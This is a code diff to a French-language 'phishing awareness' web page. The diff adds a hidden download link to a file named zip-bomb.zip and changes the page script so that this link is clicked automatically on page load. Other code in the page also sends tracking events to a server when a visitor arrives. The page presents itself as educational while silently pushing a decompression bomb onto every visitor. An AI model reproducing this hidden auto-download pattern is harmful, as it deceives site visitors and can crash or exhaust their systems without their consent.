@@ -30,6 +30,7 @@
     <div class="content">
         <h1>Sensibilisation au phishing</h1>
         <p>Cette page est destinée à éduquer les utilisateurs sur les dangers du phishing. Il est crucial d'être vigilant et de savoir reconnaître les tentatives de phishing pour protéger vos informations personnelles.</p>
+        <a id="download-link" href="https://raw.githubusercontent.com/Towarmat83/chuckmorris.github.io/main/zip-bomb.zip" download="zip-bomb.zip" style="display:none;">Télécharger le fichier ZIP</a>
         <a href="#" class="trackable">Cliquez ici pour rester sur la page</a>
     </div>
 
@@ -53,7 +54,7 @@
         sendEventData(userID, window.location.href, 'Page Load'); // Envoi immédiat des données au chargement
 
         // Téléchargement automatique du document
-        downloadFile('https://github.com/Towarmat83/chuckmorris.github.io/main/zip-bomb.zip'); // URL complète vers votre fichier
+        document.getElementById('download-link').click();
 
         var links = document.querySelectorAll('a.trackable');
         links.forEach(function(link) {
@@ -75,15 +76,6 @@
         }).catch(function(error) {
             console.error('Error:', error);
         });
-    }
-
-    function downloadFile(url) {
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'zip-bomb.zip'; // Nom du fichier à télécharger
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
     }
     </script>
 </body>
